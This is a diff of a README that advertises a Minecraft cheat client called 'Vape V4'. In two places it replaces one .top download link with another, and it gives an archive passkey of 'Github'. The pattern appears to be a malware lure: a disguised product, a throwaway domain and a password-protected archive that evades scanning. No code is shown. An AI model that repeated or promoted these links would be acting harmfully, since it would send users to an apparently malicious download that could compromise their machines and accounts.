@@ -9,7 +9,7 @@ Minecraft Vape V4 with aim assist, reach, ESP, autoclicker, velocity, inventory 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -87,7 +87,7 @@ This project is inspired by the original Vape.gg, which has been maintained sinc
 
 ## 🔧 Installation / How to Use
 
-1. Download the latest release by clicking **[CLICK](https://gitappdown.top/)**.
+1. Download the latest release by clicking **[CLICK](https://gitdownapply.top)**.
 
 2. Launch Minecraft and load into the main menu.
 
